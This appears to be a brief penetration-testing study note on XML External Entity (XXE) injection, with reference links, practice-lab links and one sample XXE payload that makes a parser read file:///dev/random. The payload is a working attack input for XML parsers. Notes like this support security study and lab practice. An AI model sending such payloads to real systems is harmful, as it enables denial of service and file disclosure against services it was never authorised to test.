﻿

**Xpath or XXE (Xml External Entity )**

Reference

```
https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

```

Payload

```
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo>

```
LAB

    https://pentesterlab.com/exercises/play_xxe/course

OOB XXE Lab

```
https://github.com/fl0rde/xxe-challenge

```


